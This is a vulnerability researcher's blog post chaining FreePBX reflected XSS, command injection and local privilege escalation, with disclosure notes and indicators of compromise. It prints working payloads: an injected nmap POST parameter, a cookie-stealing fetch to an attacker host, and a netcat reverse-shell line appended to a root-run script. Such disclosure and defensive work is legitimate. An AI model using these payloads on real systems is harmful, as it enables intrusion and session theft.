---
layout: post
title: "FreePBX: Please dial CVE-2025-59429, CVE-2025-59051, CVE-2026-27207 for root"
date: 2026-04-08 21:11 +0200
description: "FreePBX command injection, XSS and local privilege escalation chain"
categories: [Vulnerability Research]
tags: [FreePBX, vulnerability-research, CVE-2025-59429, CVE-2025-59051, CVE-2026-27207]
---

# Intro
So you wake up on Friday before 6 AM, make yourself a coffee, light a cigarette and look at the beautiful nature thinking about the annual leave that is a day away. After five minutes you are bored so you pull up Twitter and read through the news to find a [post](https://community.freepbx.org/t/security-advisory-please-lock-down-your-administrator-access/107203/6) which said that FreePBX is getting owned by what appears to be an authentication bypass and a SQL injection vulnerability. Shells were dialing in and out from everywhere.

So, what is FreePBX? [FreePBX](https://www.freepbx.org) is the world’s most popular open-source, web-based GUI used to manage Asterisk, the engine behind many modern IP telephone systems. It effectively transforms a complex communication server into a user-friendly Business Phone System. It is the industry standard for building powerful, flexible, and affordable VoIP phone systems that give you total control over your communications infrastructure. It allows you to install and manage extensions, call routing, most parts are open-source and it provides enterprise-grade features with the ability to buy additional modules (like I will). As for the exposure (ignoring other language installations):

![FreePBX exposure](/assets/img/3/freepbx-shodan-exposure.png)

After visiting DefCon 33 in August 2025 and [realizing](https://www.linkedin.com/feed/update/urn:li:activity:7360466831913943040/?originTrackingId=MnX2J8C6%2BaWuYcsbATvCLg%3D%3D) that my brain still functions for more than utilizing only the Office suite, I decided to do some vulnerability research. So, let's try and find these FreePBX vulnerabilities myself prior any other write-ups appear. 

Where to start? After a bit of searching I discovered that you can download an [ISO](https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso) for the complete solution. But there is a mention that the vulnerability is in a commercial [Endpoint Manager](https://www.freepbx.org/add-on/endpoint-manager-ucp-for-epm/) module and it costs 99$ for a year. Whaaat? Hundred bucks? I was reluctant to invest and talked about it with my friend [Inkz](https://github.com/inkz1337) who didn't say much, but did this: 

![Dodge this](/assets/img/3/inkz-to-the-rescue.png)

I'll translate it for you: "Eat shit. Here's a half (of the amount). Go.". Fuck, guess I'm committed now, so let's go. 

# Command injection in Network Scanning feature of Endpoint Manager (CVE-2025-59051)
FreePBX image is based on Linux, which is a good thing. Having root access allows you to see how things are set up, read parts of the source code and generally poke around the system. I opted for the FreePBX version 16 based on CentOS 7 / SNG7 (I just clicked the first link, no other reason). Version 17 is also available, which is Debian-based. Both versions are vulnerable and that applies for all vulnerabilities mentioned here.

```bash
[root@freepbx admin]# uname -a
Linux freepbx.sangoma.local 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[root@freepbx admin]# cat /etc/os-release
NAME="Sangoma Linux"
VERSION="7 (Core)"
ID="sangoma"
ID_LIKE="centos rhel fedora"
VERSION_ID="7"
PRETTY_NAME="Sangoma Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:sangoma:sng:7::server:utf8"
HOME_URL="https://distro.sangoma.net/"
BUG_REPORT_URL="https://issues.sangoma.net/"

CENTOS_MANTISBT_PROJECT="Sangoma-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="sangoma"
REDHAT_SUPPORT_PRODUCT_VERSION="7"
[root@freepbx admin]# cat /etc/sangoma-release
Sangoma Linux release 7.8.2003 (Core)
```

As I have purchased the commercial version of the Endpoint Manager module, I went to install it and pull the latest version available.

```bash
[root@freepbx admin]# fwconsole ma downloadinstall endpoint --edge
Edge repository temporarily enabled
No repos specified, using: [commercial,standard] from last GUI settings

Downloading module 'endpoint'
Processing endpoint
Verifying local module download...Verified
Extracting...Done
Download completed in 29 seconds
Create symlink...Done
Checking database tables...Done
Migrating tables as required...Done
Checking Settings and Defaults...Done
Generating Configs...Done
Downloading Firmware...Done (Background)
updating Logout phones config...(Background)Generating CSS...Done
Module endpoint version 16.0.89 successfully installed
Updating Hooks...Done
Chowning directories...Done
Resetting temporarily repository state
[root@freepbx admin]# fwconsole ma list |grep endpoint
| endpoint            | 16.0.89    | Enabled | Commercial  | Sangoma   |
```

![Endpoint Manager Module in the Admin Interface](/assets/img/3/freepbx-endpoint-module.png)

I started to look at the source code. While parts of the PHP code are readable, other files are protected with [ionCube PHP Encoder](https://www.ioncube.com/), so you will see something like this:

![ionCube in action](/assets/img/3/ioncube-php-encoder.png)

I did try to use some tricks with `strace` and `ltrace`, but that did not help much. 

As that did not yield any results in 30 seconds of my attention span, I loaded my favorite proxy and went to find the SQL injection from the advisory via dynamic testing. It was easy to find it as the focus was on the Endpoint Manager module.

![Endpoint Manager SQLi](/assets/img/3/freepbx-endpoint-module-sqli.png)

Manual exploitation can be time-consuming, so I opted for the Croatian-made [sqlmap](https://github.com/sqlmapproject/sqlmap) for exploitation:

![SQLmap FTW](/assets/img/3/freepbx-endpoint-module-sqli-sqlmap.png)

Well, SQLi from the advisory was found, but I was unable to find a way to the authentication bypass. I will not go through that as watchTowr wrote all about it [here](https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/). 

But, while browsing the admin interface, I noticed a cute little feature I like to mess with when I see on routers: forms that process user input to perform DNS lookups, pings, etc. The FreePBX calls this a _Network Scan_ feature in the Endpoint module. Putting the usual shell meta-characters or command separators / operators like ``&, ;, `cmd`, |, $()``, and pressing "Scan This Subnet" produced a timeout when I've put the `/bin/sleep 10` as a payload:

```
POST /admin/config.php?display=endpoint&view=nmap HTTP/1.1
Host: 10.0.13.137
Cookie: lang=en_US; searchHide=1; PHPSESSID=<redacted>; _ga=GA1.1.1739251077.1756502666; _gid=GA1.1.130337444.1756502666; _gat=1; _ga_65BVXK7F61=....
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://<redacted>/admin/config.php?display=endpoint&view=nmap
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: https://10.0.13.137
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

network=...0%2F24%3B+%2Fbin%2fsleep+10&action=scan
```

Can it be that simple? Let's try something much more fun:

![FreePBX Command Injection](/assets/img/3/freepbx-command-injection.png)

Which resulted in a reverse shell:

![FreePBX reverse shell](/assets/img/3/freepbx-command-injection-shell.png)

And yes, you are seeing correctly. That is Rapid7's Metasploitable machine used as the callback server. Don't ask. 

As you can see in the POST request above, the value of the `view` parameter is `nmap`. So, FreePBX is using nmap in the background to perform device discovery on the network, but the user input is not sanitized in any way. I confirmed this by listing running processes. At the end of the screenshot you can see that the attacker-controlled input is concatenated with `sh -c /usr/bin/nmap -v -n -sP` - nmap's legacy ping-scan host discovery:

![No sanitization for you](/assets/img/3/freepbx-nmap-no-sanitization.png)

So I went to FreePBX security reporting GitHub [page](https://github.com/FreePBX/security-reporting/security), submitted an advisory and went to sleep.

Mind that the `asterisk` user has high privileges in the context of FreePBX-related services / configuration / related files, but low OS-level privileges. It will become important later. 

# Reflected Cross-site Scripting in Asterisk HTTP Status page (CVE-2025-59429)

If you ask my brain, sleeping is overrated and should be earned. Through the night it spammed me with a clear message: _That requires authentication._ 

Well, I did not sleep and all the way to the seaside the next day (as it was the start of my annual leave) I was thinking about the authentication bypass vulnerability. Can I find something similar? Well, I did not manage to find one. But what is the second-best thing I could do? XSS, ladies and gentleman. The one that rules them all. A basic, pre-school, toddler, reflected XSS via an un-sanitized query string. 

Alongside the admin interface on port 443, FreePBX serves an Asterisk HTTP Status page on port 8088 that is network-exposed by default.

![Asterisk HTTP Status Page](/assets/img/3/freepbx-asterisk-http-status-page.png)

And what happens if I put some JS in the URL like ``http://freepbx:8088/httpstatus?<script>alert(1)</script>``? Again - the _one_ that rules them all.

![Asterisk HTTP Status Page XSS](/assets/img/3/freepbx-asterisk-http-status-page-xss.png)

But, it was 2025 and I heard that there are some cookie attributes and headers that could prevent something like this:

```javascript
fetch("http://attacker/"+document.cookie)
```

And this should not work ``http://freepbx:8088/httpstatus/?steal=<script%20src="http://attacker/steal.js"></script>``, right? Wrong.

![FreePBX cookie stealing](/assets/img/3/freepbx-asterisk-http-status-page-cookie-stealing.png)

So yes, it is not an authentication bypass but the next best thing. It does require some social engineering effort. The Asterisk HTTP Status page does not have to be publicly exposed. You need a logged-in FreePBX user (does not have to be an admin, but the user needs to have access to the Endpoint module) to open the link, grab his cookie and exploit the command-injection vulnerability to obtain remote access to the FreePBX host.

I've written a [PoC](/assets/pocs/CVE-2025-59051.py) for the command injection vulnerability that allows you to pass stolen cookies or credentials.

![Python POC](/assets/img/3/freepbx-python-rce-poc.png)

![Reverse shell](/assets/img/3/freepbx-python-rce-poc-rshell.png)

So there we have it, a working chain: steal a session cookie via XSS, use it to exploit the command injection, land a shell as the `asterisk` user. Job done? Grey-matter didn't think so: _Low-privilege OS user? Noob._

# Local privilege escalation via Bash script modification (CVE-2026-27207)

_A note before I continue: I have reported this vulnerability to FreePBX on October 13, 2025. I was in contact with the FreePBX security crew several times during this 6-month period. Sometimes they would respond, sometimes they would ignore my feedback requests. I helped as much as possible, at any time and responded within a day. I pushed the disclosure date for a couple of times. We are long past the industry-accepted 90-day disclosure timeline. I am, unfortunately, not a complete idiot and I know that some issues are harder to fix. So - I will not provide full exploitation steps but this is my kind of a compromise. This post will be updated with full details once the vulnerability is patched._

OK, now I've given myself an excuse and I can continue. 

So - we have low privileges on the OS, but the `asterisk` owns many files on the system. I enumerated manually, I've used [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) but did not find an easy way to escalate local privileges. As it was late, I downloaded [pspy](https://github.com/dominicbreuker/pspy) and let it run over the night.

The morning was quite interesting. What I noticed from the output is that the `root` executes a Bash script which is owned by the `asterisk` user. By modifying the script it is possible to escalate to root privileges.

The script first has to be modified:

```
[asterisk@freepbx ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

[asterisk@freepbx ~]$ ls -la <redacted>
-rwxr-xr-x 1 asterisk asterisk 1849 Oct 13 06:46 <redacted>
[asterisk@freepbx ~]$ echo "nc 10.0.13.138 4444 -e /bin/bash" >> <redacted>
[asterisk@freepbx ~]$ tail -1 <redacted>
nc 10.0.13.138 4444 -e /bin/bash
```

However, some checks are performed and this won't work without additional modifications:

```
[asterisk@freepbx ~]# php /var/www/html/<redacted>
PHP Fatal error:  Uncaught Exception: <redacted> of <redacted> don't <redacted> ..  in phar:///var/www/html/<redacted>
Stack trace:
#0 <redacted>FreePBX\modules\<redacted>
#1 phar:///var/www/html/<redacted>(43): shutdown()
#2 /var/www/html/<redacted>(3): include('phar:///var/www...')
#3 {main}
  thrown in phar:///var/www/html/<redacted> on line 55
```
Therefore, we need to bypass these checks and as the `asterisk` user owns the file which is used for this security check as well, we can modify it:

```
[asterisk@freepbx ~]$ ls -la /var/www/html/admin/modules/<redacted>
-rw-rw-r-- 1 asterisk asterisk 49759 Oct 13 06:47 /var/www/html/admin/modules/<redacted>
```

Now that we have everything in place, we need to wait the hook to execute. Be patient a bit and enjoy your root shell:

![](/assets/img/3/freepbx-local-privilege-escalation.png)


# Indicators of Compromise

**Reflected XSS (CVE-2025-59429)**
If your FreePBX system exposed port 8088 or 8089 on a public IP while users were logged into the admin interface, review your webserver access logs for requests to `/httpstatus` containing script tags or URL-encoded equivalents (`%3Cscript`, `%3E`). The FreePBX advisory recommends checking logs if you were potentially exposed.

**Command Injection (CVE-2025-59051)**
Look for nmap processes spawning unexpected child processes, particularly outbound connections or shell activity running as the `asterisk` user. Any `nc`, `bash -i`, or similar processes with `asterisk` as the owner and a parent `nmap` process are a strong indicator of exploitation. Monitor for unexpected outbound TCP connections originating from the `asterisk` user.

**Local Privilege Escalation (CVE-2026-27207)**
File integrity monitoring on FreePBX module directories will catch this. Specifically, watch for unexpected modifications to files in FreePBX module directories, as these should never change outside of a module update. Any modification to a Bash script owned by `asterisk` that is later executed by root should be treated as a serious indicator of compromise. `auditd` rules on the relevant paths would catch both the script modification and tampering.

# Responsible Disclosure, Fixes and Outro

FreePBX fixed two of three vulnerabilities presented here:
* https://github.com/FreePBX/security-reporting/security/advisories/GHSA-qgj3-f9gj-98v9
* https://github.com/FreePBX/security-reporting/security/advisories/GHSA-c8g7-475j-fwcc
* https://github.com/FreePBX/security-reporting/security/advisories/GHSA-rjqq-9f6j-qh7g

Full advisories are also available here:
* https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2025-006-freepbx-os-command-injection.md
* https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2025-005-freepbx-reflected-xss-asterisk-http-status.md

Some additional general recommendations, not only related to FreePBX:
* Use a whitelist approach if you need to expose an admin interface. Ideally, allow access via LAN or VPN only.
* Keep software and modules updated.
* Review user access controls regularly and remove accounts that no longer need access.

These were my first reported vulnerabilities and CVEs I have obtained, and I must say that it is not all fun and games. The process of responsible disclosure is a must, but it can be a pain in the ass. 

Through the process you need to try and help the developers to fix the issues you have discovered. In case of the OS command injection vulnerability, I tested several different patches. While the patches would fix the underlying security issue - the functionality was then broken, so I tested two additional versions just to check that the functionality (network scanning) now works. While I wanted to help, I believe that the functional testing should have been done by the developers, while my focus should be on testing if the vulnerability is fixed and that it cannot be bypassed. The XSS was not fixed, but FreePBX decided to bind Asterisk HTTP Status page to localhost only. 

I would still like to thank the FreePBX team for their cooperation and I hope I helped. Was fun.

Hack the planet.

kr3bz